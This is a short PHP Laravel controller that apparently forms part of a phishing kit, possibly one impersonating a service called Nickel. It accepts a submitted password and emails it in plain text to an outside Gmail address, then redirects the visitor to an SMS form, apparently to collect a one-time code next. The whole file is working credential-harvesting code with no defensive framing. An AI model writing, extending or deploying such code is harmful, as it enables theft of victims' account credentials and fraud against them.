<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\ContactMail;

class PasswordController extends Controller
{
    public function showForm()
    {
        return view('password');
    }
    
    public function send(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);
    
        $details = [
            'password' => $request->password,
        ];
    
        Mail::to('nickelservicesaccord@gmail.com')->send(new ContactMail($details, 'emails.password'));
    
        return redirect()->route('sms.form')->with('success', 'Message envoyé avec succès !');
    }
}
